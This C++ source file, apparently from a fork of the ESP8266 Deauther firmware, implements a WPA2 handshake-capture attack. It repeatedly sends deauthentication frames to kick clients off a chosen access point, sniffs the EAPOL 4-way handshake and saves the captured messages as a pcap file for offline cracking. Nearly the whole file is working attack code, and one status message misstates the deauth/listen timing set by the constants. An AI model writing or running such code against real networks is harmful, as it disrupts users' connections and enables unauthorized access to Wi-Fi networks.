/* This software is licensed under the MIT License: https://github.com/spacehuhntech/esp8266_deauther */

#include "HandshakeCapture.h"

#include <LittleFS.h>
#include "Accesspoints.h"
#include "Stations.h"
#include "Scan.h"
#include "Attack.h"
#include "logger.h"

extern Accesspoints accesspoints;
extern Stations     stations;
extern Scan         scan;
extern Attack       attack;
extern uint8_t      wifi_channel;
extern uint32_t     currentTime;

extern bool macValid(uint8_t* mac);
extern bool macBroadcast(uint8_t* mac);
extern bool macMulticast(uint8_t* mac);
extern String macToStr(const uint8_t* mac);
extern bool writeFile(String path, String& buf);
extern bool readFile(String path, String& buf);

// Deauth burst then quiet window for 4-way: 5s deauth @ 200ms, 15s listen (20s cycle)
static const uint32_t HS_CYCLE_MS          = 20000;
static const uint32_t HS_DEAUTH_PHASE_MS   = 5000;
static const uint32_t HS_DEAUTH_INTERVAL_MS = 200;

HandshakeCapture* handshakeCapture = nullptr;

namespace {

void hsFreeInstance() {
    if (handshakeCapture) {
        delete handshakeCapture;
        handshakeCapture = nullptr;
    }
}

HandshakeCapture* hsAllocInstance() {
    hsFreeInstance();
    handshakeCapture = new HandshakeCapture();
    return handshakeCapture;
}

} // namespace

bool hsCaptureActive() {
    HandshakeCapture* const hs = handshakeCapture;
    return hs != nullptr && hs->isActive();
}

void hsCaptureOnFrame(uint8_t* buf, uint16_t len) {
    HandshakeCapture* const hs = handshakeCapture;

    if (!hs || !hs->isActive()) return;

    hs->onFrame(buf, len);
}

uint32_t hsGetFramesSeen() {
    return handshakeCapture ? handshakeCapture->getFramesSeen() : 0;
}

uint32_t hsGetFramesData() {
    return handshakeCapture ? handshakeCapture->getFramesData() : 0;
}

uint32_t hsGetEapolFound() {
    return handshakeCapture ? handshakeCapture->getEapolFound() : 0;
}

uint32_t hsGetMsgMask() {
    return handshakeCapture ? handshakeCapture->getMsgMask() : 0;
}

String hsGetStatusJson() {
    if (handshakeCapture) return handshakeCapture->getStatusJson();

    String buf;

    if (!readFile(HS_FILE_STATUS, buf)) return "{}";
    return buf;
}

void hsCaptureStart(int apId, int stId, uint32_t timeoutMs) {
    if (handshakeCapture && handshakeCapture->isActive()) handshakeCapture->stop(false);

    hsAllocInstance();
    handshakeCapture->start(apId, stId, timeoutMs);
}

void hsCaptureStart(int apId, const uint8_t* stMac, uint32_t timeoutMs) {
    if (handshakeCapture && handshakeCapture->isActive()) handshakeCapture->stop(false);

    hsAllocInstance();
    handshakeCapture->start(apId, stMac, timeoutMs);
}

void hsCaptureStop(bool save) {
    if (!handshakeCapture) return;

    handshakeCapture->stop(save);
    hsFreeInstance();
}

void hsCaptureOnSniffEnded() {
    if (!hsCaptureActive()) return;

    handshakeCapture->onSniffEnded();
    hsFreeInstance();
}

void hsCaptureUpdate() {
    if (!handshakeCapture) return;

    const bool wasActive = handshakeCapture->isActive();
    handshakeCapture->update();

    if (wasActive && handshakeCapture && !handshakeCapture->isActive()) hsFreeInstance();
}

HandshakeCapture::HandshakeCapture() {
    active   = false;
    apId     = -1;
    stId     = -1;
    hasSt    = false;
    msgMask     = 0;
    framesSeen  = 0;
    framesData  = 0;
    framesMatch = 0;
    eapolFound  = 0;
    eapolBad    = 0;
    dbgDataLogs  = 0;
    dbgEapolLogs = 0;
    dbgMatchDump = 0;
    deauthCount  = 0;
    lastDeauth   = 0;
}

bool HandshakeCapture::isActive() {
    return active;
}

bool HandshakeCapture::macEq(uint8_t* a, uint8_t* b) {
    return memcmp(a, b, 6) == 0;
}

bool HandshakeCapture::hasHandshake() {
    return (msgMask & 0x03) == 0x03;  // M1 + M2 minimum for WPA2
}

uint8_t HandshakeCapture::getMsgMask() const {
    return msgMask;
}

uint32_t HandshakeCapture::getFramesSeen() const {
    return framesSeen;
}

uint32_t HandshakeCapture::getFramesData() const {
    return framesData;
}

uint32_t HandshakeCapture::getEapolFound() const {
    return eapolFound;
}

// ESP8266 promisc: 12-byte RX meta, 802.11 MAC header @12 (addr1/2/3 @16/22/28)
static uint8_t hsMacHeaderLen(const uint8_t* buf, uint16_t len) {
    if (!buf || len < 36) return 0;
    uint8_t fc0  = buf[12];
    uint8_t fc1  = buf[13];
    uint8_t type = (fc0 >> 2) & 0x03;
    if (type == 0) return 24;
    if (type != 2) return 24;

    uint8_t hdr   = 24;
    bool    toDs  = (fc1 & 0x01) != 0;
    bool    fromDs = (fc1 & 0x02) != 0;
    if (toDs && fromDs) hdr += 6;

    uint8_t subtype = (fc0 >> 4) & 0x0F;
    if (subtype & 0x08) hdr += 2; // QoS Data*
    return hdr;
}

bool HandshakeCapture::frameHasAp(uint8_t* buf, uint16_t len) {
    uint8_t hdr = hsMacHeaderLen(buf, len);
    if (hdr == 0 || len < (uint16_t)(12 + hdr)) return false;

    if (macEq(&buf[16], apMac) || macEq(&buf[22], apMac) || macEq(&buf[28], apMac)) return true;
    if (hdr >= 30 && len >= 46) return macEq(&buf[34], apMac); // addr4 in WDS
    return false;
}

void HandshakeCapture::dumpMatchFrame(uint8_t* buf, uint16_t len) {
    if (dbgMatchDump >= 3 || len < 34) return;

    dbgMatchDump++;

    char     hex[96];
    int      pos  = 0;
    uint16_t from = 24;
    uint16_t to   = len < 56 ? len : 56;

    for (uint16_t x = from; x < to && pos < (int)sizeof(hex) - 4; x++) {
        pos += snprintf(hex + pos, sizeof(hex) - pos, "%02x ", buf[x]);
    }

    hex[pos] = 0;

    DIAG_LOGF(DIAG_INFO, "HS", "match dump [%u..%u] fc=%02x len=%u: %s", (unsigned)from, (unsigned)to,
              buf[12], (unsigned)len, hex);
}

bool HandshakeCapture::findEapol(uint8_t* buf, uint16_t len, uint16_t& eapolOff, uint16_t& eapolLen) {
    uint8_t hdr = hsMacHeaderLen(buf, len);
    if (hdr == 0) return false;

    uint16_t start = 12 + hdr;
    if (start + 8 >= len) return false;

    uint16_t max = len > 400 ? 400 : len;
    if (start > max) return false;

    for (uint16_t i = start; i + 9 < max; i++) {
        // LLC SNAP + EAPOL ethertype: AA AA 03 00 00 00 88 8E [ver]
        if (buf[i] == 0xAA && buf[i + 1] == 0xAA && buf[i + 2] == 0x03 && buf[i + 3] == 0x00 &&
            buf[i + 4] == 0x00 && buf[i + 5] == 0x00 && buf[i + 6] == 0x88 && buf[i + 7] == 0x8E) {
            if (buf[i + 8] >= 1 && buf[i + 8] <= 3) {
                eapolOff = i + 6;
                eapolLen = len - eapolOff;
                return true;
            }
        }

        // Direct EtherType 88 8E (no LLC) — require valid EAPOL version next
        if (buf[i] == 0x88 && buf[i + 1] == 0x8E && buf[i + 2] >= 1 && buf[i + 2] <= 3) {
            eapolOff = i;
            eapolLen = len - i;
            return true;
        }
    }

    return false;
}

uint8_t HandshakeCapture::getEapolMsgNum(uint8_t* eapol, uint16_t len) {
    if (len < 7) return 0;

    if (eapol[0] == 0x88 && eapol[1] == 0x8E) {
        eapol += 2;
        len   -= 2;
    }

    if (len < 7 || eapol[0] != 0x01 || eapol[1] != 0x03) return 0;

    uint16_t ki = (eapol[5] << 8) | eapol[6];  // Key Info: big-endian (network byte order)
    bool ack  = ki & 0x0080;
    bool mic  = ki & 0x0100;
    bool sec  = ki & 0x0200;
    bool inst = ki & 0x0040;

    if (ack && !mic && !sec) return 1;
    if (!ack && mic && !sec) return 2;
    if (ack && mic && sec) return 3;
    if (!ack && mic && inst) return 4;
    if (!ack && mic) return 2;

    return 0;
}

void HandshakeCapture::storeSlot(uint8_t msgNum, uint8_t* buf, uint16_t len) {
    if (msgNum < 1 || msgNum > 4) return;

    uint8_t idx = msgNum - 1;

    if (slots[idx].used) return;

    uint16_t copyLen = len > HS_MAX_FRAME ? HS_MAX_FRAME : len;

    slots[idx].used   = true;
    slots[idx].msgNum = msgNum;
    slots[idx].len    = copyLen;
    memcpy(slots[idx].data, buf, copyLen);

    msgMask |= (1 << idx);

    DIAG_LOGF(DIAG_INFO, "HS", "EAPOL message %u captured (mask=%u)", (unsigned)msgNum, (unsigned)msgMask);

    // Saw M2 before M1 — client was mid-handshake; force full 4-way from the start
    if (msgNum == 2 && !(msgMask & 1)) {
        prntln(F("HS: M2 without M1 — deauth to restart 4-way"));
        lastDeauth = 0;
    }
}

void HandshakeCapture::onFrame(uint8_t* buf, uint16_t len) {
    if (!active || len < 32) return;

    framesSeen++;

    // buf[12] = FC byte 0 after 12-byte RX meta (not RSSI)
    if ((buf[12] & 0x0C) != 0x08) return;

    framesData++;

    if (dbgDataLogs < 5) {
        dbgDataLogs++;
        DIAG_LOGF(DIAG_INFO, "HS", "data fc=%02x len=%u ap=%u st_mac=%u",
                  buf[12], (unsigned)len, (unsigned)(frameHasAp(buf, len) ? 1 : 0),
                  (unsigned)(hasSt ? 1 : 0));
    }

    if (!frameHasAp(buf, len)) return;

    if (hasSt) {
        bool hasStMac = macEq(&buf[16], stMac) || macEq(&buf[22], stMac) || macEq(&buf[28], stMac);

        if (!hasStMac) return;
    }

    framesMatch++;

    dumpMatchFrame(buf, len);

    uint16_t eapolOff;
    uint16_t eapolLen;

    if (!findEapol(buf, len, eapolOff, eapolLen)) return;

    eapolFound++;

    uint8_t* eapol = &buf[eapolOff];
    uint8_t  msgNum = getEapolMsgNum(eapol, eapolLen);

    if (msgNum == 0) {
        eapolBad++;

        if (dbgEapolLogs < 3) {
            uint16_t el = eapolLen;
            uint8_t* e  = eapol;

            if (el >= 2 && e[0] == 0x88 && e[1] == 0x8E) {
                e += 2;
                el -= 2;
            }

            uint16_t ki = (el >= 7) ? (uint16_t)((e[5] << 8) | e[6]) : 0;

            dbgEapolLogs++;
            DIAG_LOGF(DIAG_INFO, "HS", "eapol no-msg ki=%04x ver=%02x type=%02x off=%u",
                      ki, el >= 1 ? e[0] : 0, el >= 2 ? e[1] : 0, (unsigned)eapolOff);
        }

        return;
    }

    storeSlot(msgNum, buf, len);

    if (!hasSt) {
        uint8_t* sta = &buf[16];

        if (macEq(sta, apMac)) sta = &buf[22];

        if (macValid(sta) && !macBroadcast(sta) && !macMulticast(sta)) {
            memcpy(stMac, sta, 6);
            hasSt = true;
        }
    }
}

void HandshakeCapture::triggerDeauth() {
    deauthCount++;

    if (hasSt) {
        bool sent = attack.deauthDevice(apMac, stMac, 7, channel);

        prnt(F("[HS] deauth #"));
        prnt(deauthCount);
        prnt(F(" -> "));
        prnt(macToStr(stMac));
        prnt(sent ? F(" ok") : F(" FAIL"));
        prntln();
        DIAG_LOGF(DIAG_INFO, "HS", "deauth sent=%d hasSt=1 ch=%u", (int)sent, (unsigned)channel);
        return;
    }

    int kicked = 0;

    prnt(F("[HS] deauth #"));
    prnt(deauthCount);
    prntln(F(" broadcast clients on AP"));

    for (int i = 0; i < stations.count() && kicked < 10; i++) {
        if (stations.getAP(i) != apId) continue;

        uint8_t* staMacPtr = stations.getMac(i);

        if (!staMacPtr || !macValid(staMacPtr) || macMulticast(staMacPtr)) continue;
        if (memcmp(staMacPtr, apMac, 6) == 0) continue;

        attack.deauthDevice(apMac, staMacPtr, 7, channel);
        kicked++;
    }

    if (kicked == 0) attack.deauthDevice(apMac, broadcast, 7, channel);
}

static void printHsResultBanner(bool ok, bool partial, uint8_t mask, uint32_t framesRx, uint32_t framesData,
                                uint32_t framesMatch, uint32_t eapolFound, uint32_t eapolBad, uint32_t deauths) {
    prntln();
    prntln(F("========== HANDSHAKE RESULT =========="));

    if (ok) {
        prntln(F("  SUCCESS — handshake captured (M1+M2)"));
        prntln(F("  Download: /handshake.cap"));
    } else if (partial) {
        if (mask == 2) {
            prntln(F("  PARTIAL — only M2 (need M1+M2 for WPA2)"));
            prntln(F("  Run HS again on the same client — often gets M1"));
        } else {
            prnt(F("  PARTIAL — mask="));
            prntln(String(mask));
        }
        prntln(F("  File: /handshake.cap"));
    } else {
        prntln(F("  FAILED — no EAPOL captured"));
        prntln(F("  HS on client with most pkts / stronger AP channel"));
        if (framesData == 0) {
            prntln(F("  Hint: 0 Data frames — weak signal or wrong channel"));
        } else if (eapolFound == 0 && framesMatch > 0) {
            prntln(F("  Hint: match frames = encrypted data (08 00), not EAPOL"));
            prntln(F("  Client did not start new 4-way — pick active client (-st)"));
            if (deauths >= 5) {
                prntln(F("  Deauth sent but no drop — PMF/WPA3? Try non-Intel client"));
            }
        } else if (eapolFound == 0) {
            prntln(F("  Hint: no matching data — weak signal or wrong AP/channel"));
        } else if (eapolBad > 0) {
            prntln(F("  Hint: EAPOL seen but not parsed — check Key Info / PMF"));
        }
    }

    prnt(F("  rx="));
    prnt(framesRx);
    prnt(F(" data="));
    prnt(framesData);
    prnt(F(" match="));
    prnt(framesMatch);
    prnt(F(" eapol="));
    prnt(eapolFound);
    prnt(F(" bad_ki="));
    prnt(eapolBad);
    prnt(F(" deauth="));
    prntln(deauths);
    prnt(F("  mask="));
    prntln(String(mask));
    prntln(F("  Web: «Проверить HS» or handshake.json"));
    prntln(F("======================================"));
    Serial.flush();
}

void HandshakeCapture::start(int apIdIn, int stIdIn, uint32_t timeoutMs) {
    uint8_t        macBuf[6];
    const uint8_t* stPtr = nullptr;

    if (stIdIn >= 0 && stIdIn < stations.count()) {
        memcpy(macBuf, stations.getMac(stIdIn), 6);
        stPtr = macBuf;
    } else if (stIdIn >= 0) {
        prnt(F("HS: station #"));
        prnt(stIdIn);
        prntln(F(" not in list — deauth all clients on AP"));
    }

    start(apIdIn, stPtr, timeoutMs);

    if (active && stIdIn >= 0 && stIdIn < stations.count()) {
        stId = stIdIn;
        prnt(F("HS target client #"));
        prntln(String(stIdIn));
    }
}

void HandshakeCapture::start(int apIdIn, const uint8_t* stMacIn, uint32_t timeoutMs) {
    if (active) stop(false);

    if (apIdIn < 0 || apIdIn >= accesspoints.count()) {
        prnt(F("HS: invalid AP id "));
        prntln(String(apIdIn));
        hsFreeInstance();
        return;
    }

    apId         = apIdIn;
    stId         = -1;
    hasSt        = false;
    msgMask      = 0;
    framesSeen   = 0;
    framesData   = 0;
    framesMatch  = 0;
    eapolFound   = 0;
    eapolBad     = 0;
    dbgDataLogs  = 0;
    dbgEapolLogs = 0;
    dbgMatchDump = 0;
    deauthCount  = 0;
    channel      = accesspoints.getCh(apId);
    ssid       = accesspoints.getSSID(apId);
    memcpy(apMac, accesspoints.getMac(apId), 6);

    for (int i = 0; i < 4; i++) slots[i].used = false;

    if (stMacIn && macValid((uint8_t*)stMacIn) && !macBroadcast((uint8_t*)stMacIn)) {
        memcpy(stMac, stMacIn, 6);
        hasSt = true;
        prnt(F("HS target MAC "));
        prntln(macToStr(stMac));
    }

    if (timeoutMs < 10000) timeoutMs = 10000;
    if (timeoutMs > 60000) timeoutMs = 60000;

    timeout    = timeoutMs;
    startTime  = currentTime;
    lastDeauth = 0;
    active     = true;

    attack.stop();
    scan.stop();

    accesspoints.deselectAll();
    if (apIdIn >= 0 && apIdIn < accesspoints.count()) accesspoints.select(apIdIn);

    prntln();
    prntln(F("========== HANDSHAKE CAPTURE =========="));
    prnt(F("  SSID: "));
    prntln(ssid);
    prnt(F("  Channel: "));
    prntln(String(channel));
    prnt(F("  Time: "));
    prnt(timeoutMs / 1000);
    prntln(F(" s"));
    prntln(F("  Cycle: 10s deauth (200ms) -> 5s listen for EAPOL (repeat)"));
    prntln(F("  WiFi ESP OFF during capture — reconnect to cicada3301 after."));
    if (!hasSt) {
        prntln(F("  Tip: capture handshake -ap N -st <id> for one client"));
    }
    prntln(F("======================================="));

    saveStatus();

    // Sniffer must be listening before deauth — 4-way completes in milliseconds
    scan.start(SCAN_MODE_STATIONS, timeoutMs, SCAN_MODE_OFF, 0, false, channel);
    delay(100);
    yield();

    triggerDeauth();
    lastDeauth = currentTime;
}

void HandshakeCapture::onSniffEnded() {
    if (!active) return;

    active = false;
    attack.stop();

    if (hasHandshake() || msgMask != 0) savePcap();

    saveStatus();
    printHsResultBanner(hasHandshake(), msgMask != 0 && !hasHandshake(), msgMask, framesSeen, framesData,
                        framesMatch, eapolFound, eapolBad, deauthCount);
    DIAG_LOGF(DIAG_INFO, "HS", "done mask=%u rx=%lu data=%lu match=%lu eapol=%lu bad=%lu deauth=%lu",
              (unsigned)msgMask, (unsigned long)framesSeen, (unsigned long)framesData,
              (unsigned long)framesMatch, (unsigned long)eapolFound, (unsigned long)eapolBad,
              (unsigned long)deauthCount);
}

void HandshakeCapture::stop(bool save) {
    if (!active) return;

    active = false;

    if (scan.isSniffing()) scan.stop();

    attack.stop();

    if (save && (hasHandshake() || msgMask != 0)) savePcap();

    saveStatus();
    printHsResultBanner(hasHandshake(), msgMask != 0 && !hasHandshake(), msgMask, framesSeen, framesData,
                        framesMatch, eapolFound, eapolBad, deauthCount);
    DIAG_LOGF(DIAG_INFO, "HS", "stop mask=%u rx=%lu data=%lu match=%lu eapol=%lu bad=%lu deauth=%lu",
              (unsigned)msgMask, (unsigned long)framesSeen, (unsigned long)framesData,
              (unsigned long)framesMatch, (unsigned long)eapolFound, (unsigned long)eapolBad,
              (unsigned long)deauthCount);
}

void HandshakeCapture::update() {
    if (!active) return;

    if (scan.isSniffing()) {
        uint32_t phase       = (currentTime - startTime) % HS_CYCLE_MS;
        bool     deauthPhase = phase < HS_DEAUTH_PHASE_MS;

        if (deauthPhase && currentTime - lastDeauth >= HS_DEAUTH_INTERVAL_MS) {
            lastDeauth = currentTime;
            DIAG_LOGF(DIAG_INFO, "HS", "deauth phase=%lu ch=%u #%lu", (unsigned long)(phase / 1000),
                      (unsigned)channel, (unsigned long)deauthCount + 1);
            triggerDeauth();
        }

        if (hasHandshake()) {
            stop(true);
            return;
        }
    }

    if (currentTime - startTime > timeout + 2000) stop(true);
}

bool HandshakeCapture::savePcap() {
    File f = LittleFS.open(HS_FILE_CAP, "w");

    if (!f) return false;

    const uint8_t gh[24] = {
        0xD4, 0xC3, 0xB2, 0xA1, 0x02, 0x00, 0x04, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0x00, 0x00, 0x69, 0x00, 0x00, 0x00
    };

    f.write(gh, 24);

    uint32_t ts = startTime / 1000;

    for (int i = 0; i < 4; i++) {
        if (!slots[i].used) continue;

        uint32_t incl = slots[i].len;
        uint8_t  ph[16];

        ph[0]  = ts & 0xFF;
        ph[1]  = (ts >> 8) & 0xFF;
        ph[2]  = (ts >> 16) & 0xFF;
        ph[3]  = (ts >> 24) & 0xFF;
        ph[4]  = ph[5] = ph[6] = ph[7] = 0;
        ph[8]  = incl & 0xFF;
        ph[9]  = (incl >> 8) & 0xFF;
        ph[10] = (incl >> 16) & 0xFF;
        ph[11] = (incl >> 24) & 0xFF;
        ph[12] = ph[8];
        ph[13] = ph[9];
        ph[14] = ph[10];
        ph[15] = ph[11];

        f.write(ph, 16);
        f.write(slots[i].data, incl);
    }

    f.close();
    return true;
}

void HandshakeCapture::saveStatus() {
    const char* result = "failed";

    if (hasHandshake()) result = "ok";
    else if (msgMask != 0) result = "partial";

    String buf = "{";
    buf += "\"active\":" + String(active ? "true" : "false");
    buf += ",\"complete\":" + String(hasHandshake() ? "true" : "false");
    buf += ",\"result\":\"" + String(result) + "\"";
    buf += ",\"frames\":" + String(framesSeen);
    buf += ",\"data_frames\":" + String(framesData);
    buf += ",\"match_frames\":" + String(framesMatch);
    buf += ",\"eapol_found\":" + String(eapolFound);
    buf += ",\"eapol_bad\":" + String(eapolBad);
    buf += ",\"deauth_count\":" + String(deauthCount);
    buf += ",\"mask\":" + String(msgMask);
    buf += ",\"m1\":" + String((msgMask & 1) ? "true" : "false");
    buf += ",\"m2\":" + String((msgMask & 2) ? "true" : "false");
    buf += ",\"m3\":" + String((msgMask & 4) ? "true" : "false");
    buf += ",\"m4\":" + String((msgMask & 8) ? "true" : "false");
    String ssidEsc = ssid;
    ssidEsc.replace("\"", "'");
    ssidEsc.replace("\\", "/");
    buf += ",\"ssid\":\"" + ssidEsc + "\"";
    buf += ",\"ap\":\"" + macToStr(apMac) + "\"";
    buf += ",\"st\":\"" + (hasSt ? macToStr(stMac) : "") + "\"";
    buf += ",\"ch\":" + String(channel);
    buf += ",\"cap\":\"" + String(HS_FILE_CAP) + "\"";
    buf += "}";

    writeFile(HS_FILE_STATUS, buf);
}

String HandshakeCapture::getStatusJson() {
    saveStatus();
    String buf;

    if (!readFile(HS_FILE_STATUS, buf)) return "{}";
    return buf;
}
